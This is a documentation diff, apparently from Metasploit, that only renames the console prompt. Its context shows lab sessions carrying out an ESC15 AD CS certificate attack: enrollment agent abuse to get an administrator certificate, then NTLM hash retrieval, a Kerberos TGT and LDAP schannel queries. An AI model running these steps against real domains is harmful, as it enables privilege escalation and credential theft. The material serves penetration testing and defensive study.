-msf6 auxiliary(admin/dcerpc/icpr_cert) > run
+msf auxiliary(admin/dcerpc/icpr_cert) > run
 [*] Running module against 172.30.239.85
 
 [*] 172.30.239.85:445 - Requesting a certificate...
@@ -1021,7 +1021,7 @@ msf6 auxiliary(admin/dcerpc/icpr_cert) > run
 [*] 172.30.239.85:445 -   * 1.3.6.1.5.5.7.3.2 (Client Authentication)
 [*] 172.30.239.85:445 - Certificate stored at: /home/normaluser/.msf4/loot/20241009171337_default_172.30.239.85_windows.ad.cs_089081.pfx
 [*] Auxiliary module execution completed
-msf6 auxiliary(admin/dcerpc/icpr_cert) >
+msf auxiliary(admin/dcerpc/icpr_cert) >
 ```
 
 Certificates issued using this technique are not directly able to be used for Kerberos authentication via PKINIT.
@@ -1029,21 +1029,21 @@ However, the attack can be modified by adding the Certificate Request Agent OID 
 certificate that can issue additional certificates in a manner similar to ESC2 which are compatible with PKINIT.
 
 ```msf
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set RHOSTS 172.30.239.85
+msf auxiliary(admin/dcerpc/icpr_cert) > set RHOSTS 172.30.239.85
 RHOSTS => 172.30.239.85
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set SMBUser normaluser
+msf auxiliary(admin/dcerpc/icpr_cert) > set SMBUser normaluser
 SMBUser => normaluser
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set SMBDomain COLLALABS1
+msf auxiliary(admin/dcerpc/icpr_cert) > set SMBDomain COLLALABS1
 SMBDomain => COLLALABS1
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set SMBPass normalpass
+msf auxiliary(admin/dcerpc/icpr_cert) > set SMBPass normalpass
 SMBPass => normalpass
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set CA collalabs1-SRV-ADDS01-CA
+msf auxiliary(admin/dcerpc/icpr_cert) > set CA collalabs1-SRV-ADDS01-CA
 CA => collalabs1-SRV-ADDS01-CA
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set CERT_TEMPLATE ESC15-Test
+msf auxiliary(admin/dcerpc/icpr_cert) > set CERT_TEMPLATE ESC15-Test
 CERT_TEMPLATE => ESC15-Test
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set ADD_CERT_APP_POLICY 1.3.6.1.4.1.311.20.2.1
+msf auxiliary(admin/dcerpc/icpr_cert) > set ADD_CERT_APP_POLICY 1.3.6.1.4.1.311.20.2.1
 ADD_CERT_APP_POLICY => 1.3.6.1.4.1.311.20.2.1
-msf6 auxiliary(admin/dcerpc/icpr_cert) > run
+msf auxiliary(admin/dcerpc/icpr_cert) > run
 [*] Running module against 172.30.239.85
 
 [*] 172.30.239.85:445 - Requesting a certificate...
@@ -1053,24 +1053,24 @@ msf6 auxiliary(admin/dcerpc/icpr_cert) > run
 [*] 172.30.239.85:445 -   * 1.3.6.1.4.1.311.20.2.1 (Certificate Request Agent)
 [*] 172.30.239.85:445 - Certificate stored at: /home/normaluser/.msf4/loot/20241009172714_default_172.30.239.85_windows.ad.cs_659672.pfx
 [*] Auxiliary module execution completed
-msf6 auxiliary(admin/dcerpc/icpr_cert) >
+msf auxiliary(admin/dcerpc/icpr_cert) >
 ```
 
 Next, the certificate is used in conjunction with the `PFX` and `ON_BEHALF_OF` options to issue a certificate compatible
 with Kerberos as the privileged user (previously `ALT_UPN`).
 
 ```
-msf6 auxiliary(admin/dcerpc/icpr_cert) > unset ADD_CERT_APP_POLICY 
+msf auxiliary(admin/dcerpc/icpr_cert) > unset ADD_CERT_APP_POLICY 
 Unsetting ADD_CERT_APP_POLICY...
-msf6 auxiliary(admin/dcerpc/icpr_cert) > unset ALT_UPN 
+msf auxiliary(admin/dcerpc/icpr_cert) > unset ALT_UPN 
 Unsetting ALT_UPN...
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set CERT_TEMPLATE User
+msf auxiliary(admin/dcerpc/icpr_cert) > set CERT_TEMPLATE User
 CERT_TEMPLATE => User
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set ON_BEHALF_OF COLLALABS1\\administrator
+msf auxiliary(admin/dcerpc/icpr_cert) > set ON_BEHALF_OF COLLALABS1\\administrator
 ON_BEHALF_OF => COLLALABS1\\administrator
-msf6 auxiliary(admin/dcerpc/icpr_cert) > set PFX /home/normaluser/.msf4/loot/20241009172714_default_172.30.239.85_windows.ad.cs_659672.pfx
+msf auxiliary(admin/dcerpc/icpr_cert) > set PFX /home/normaluser/.msf4/loot/20241009172714_default_172.30.239.85_windows.ad.cs_659672.pfx
 PFX => /home/normaluser/.msf4/loot/20241009172714_default_172.30.239.85_windows.ad.cs_659672.pfx
-msf6 auxiliary(admin/dcerpc/icpr_cert) > run
+msf auxiliary(admin/dcerpc/icpr_cert) > run
 [*] Running module against 172.30.239.85
 
 [*] 172.30.239.85:445 - Requesting a certificate...
@@ -1079,7 +1079,7 @@ msf6 auxiliary(admin/dcerpc/icpr_cert) > run
 [*] 172.30.239.85:445 - Certificate UPN: administrator@collalabs1.local
 [*] 172.30.239.85:445 - Certificate stored at: /home/normaluser/.msf4/loot/20241009172817_default_172.30.239.85_windows.ad.cs_427087.pfx
 [*] Auxiliary module execution completed
-msf6 auxiliary(admin/dcerpc/icpr_cert) >
+msf auxiliary(admin/dcerpc/icpr_cert) >
 ```
 
 Finally, *this* certificate can be used to authenticate to Kerberos with the `kerberos/get_ticket` module.
@@ -1100,7 +1100,7 @@ Certificates can be used to obtain the NTLM hash of an account with the PKINIT e
 action to `GET_HASH`.
 
 ```msf
-msf6 auxiliary(admin/kerberos/get_ticket) > get_hash rhosts=172.30.239.85 cert_file=/home/smcintyre/.msf4/loot/20230505083913_default_172.30.239.85_windows.ad.cs_275324.pfx
+msf auxiliary(admin/kerberos/get_ticket) > get_hash rhosts=172.30.239.85 cert_file=/home/smcintyre/.msf4/loot/20230505083913_default_172.30.239.85_windows.ad.cs_275324.pfx
 [*] Running module against 172.30.239.85
 
 [+] 172.30.239.85:88 - Received a valid TGT-Response
@@ -1110,7 +1110,7 @@ msf6 auxiliary(admin/kerberos/get_ticket) > get_hash rhosts=172.30.239.85 cert_f
 [*] 172.30.239.85:88 - TGS MIT Credential Cache ticket saved to /home/smcintyre/.msf4/loot/20230505094204_default_172.30.239.85_mit.kerberos.cca_031414.bin
 [+] Found NTLM hash for Administrator: aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f
 [*] Auxiliary module execution completed
-msf6 auxiliary(admin/kerberos/get_ticket) >
+msf auxiliary(admin/kerberos/get_ticket) >
 ```
 
 ### Getting A Kerberos Ticket
@@ -1118,21 +1118,21 @@ Certificates can be used to issue a Kerberos ticket granting ticket (TGT) which 
 services such as HTTP, LDAP and SMB. Ticket granting tickets can be requested using the `GET_TGT` action.
 
 ```msf
-msf6 auxiliary(admin/kerberos/get_ticket) > get_tgt rhosts=172.30.239.85 cert_file=/home/smcintyre/.msf4/loot/20230124173224_default_172.30.239.85_windows.ad.cs_287833.pfx
+msf auxiliary(admin/kerberos/get_ticket) > get_tgt rhosts=172.30.239.85 cert_file=/home/smcintyre/.msf4/loot/20230124173224_default_172.30.239.85_windows.ad.cs_287833.pfx
 [*] Running module against 172.30.239.85
 
 [*] 172.30.239.85:88 - Getting TGT for Administrator@daforest.com
 [+] 172.30.239.85:88 - Received a valid TGT-Response
 [*] 172.30.239.85:88 - TGT MIT Credential Cache ticket saved to /home/smcintyre/.msf4/loot/20230124202354_default_172.30.239.85_mit.kerberos.cca_566767.bin
 [*] Auxiliary module execution completed
-msf6 auxiliary(admin/kerberos/get_ticket) > klist
+msf auxiliary(admin/kerberos/get_ticket) > klist
 Kerberos Cache
 ==============
 host           principal                   sname                             issued                     status  path
 ----           ---------                   -----                             ------                     ------  ----
 172.30.239.85  Administrator@daforest.com  krbtgt/MSFLAB.LOCAL@MSFLAB.LOCAL  2023-01-24 20:23:54 -0500  valid   /home/smcintyre/.msf4/loot/20230124202354_default_172.30.239.85_mit.kerberos.cca_566767.bin
 
-msf6 auxiliary(admin/kerberos/get_ticket) >
+msf auxiliary(admin/kerberos/get_ticket) >
 ```
 
 Once the TGT has been issued, it can be seen in the output of the `klist` command. With the TGT saved, it will
@@ -1148,16 +1148,16 @@ use schannel authentication a few options must be set.
 * `SSL` -- must be set to `true` (`schannel` authentication is only compatible with TLS connections)
 
 ```msf
-msf6 auxiliary(gather/ldap_query) > set RHOSTS 172.30.239.85
+msf auxiliary(gather/ldap_query) > set RHOSTS 172.30.239.85
 RHOSTS => 172.30.239.85
-msf6 auxiliary(gather/ldap_query) > set LDAP::Auth schannel
+msf auxiliary(gather/ldap_query) > set LDAP::Auth schannel
 LDAP::Auth => schannel
-msf6 auxiliary(gather/ldap_query) > set LDAP::CertFile /home/smcintyre/.msf4/loot/20230505083913_default_172.30.239.85_windows.ad.cs_275324.pfx
+msf auxiliary(gather/ldap_query) > set LDAP::CertFile /home/smcintyre/.msf4/loot/20230505083913_default_172.30.239.85_windows.ad.cs_275324.pfx
 LDAP::CertFile => /home/smcintyre/.msf4/loot/20230505083913_default_172.30.239.85_windows.ad.cs_275324.pfx
-msf6 auxiliary(gather/ldap_query) > set SSL true
+msf auxiliary(gather/ldap_query) > set SSL true
 [!] Changing the SSL option's value may require changing RPORT!
 SSL => true
-msf6 auxiliary(gather/ldap_query) > enum_domain
+msf auxiliary(gather/ldap_query) > enum_domain
 [*] Running module against 172.30.239.85
 
 [*] Discovering base DN automatically
@@ -1178,5 +1178,5 @@ DC=msflab DC=local
  objectsid                  S-1-5-21-3402587289-1488798532-3618296993
 
 [*] Auxiliary module execution completed
-msf6 auxiliary(gather/ldap_query) >
+msf auxiliary(gather/ldap_query) >
 ```
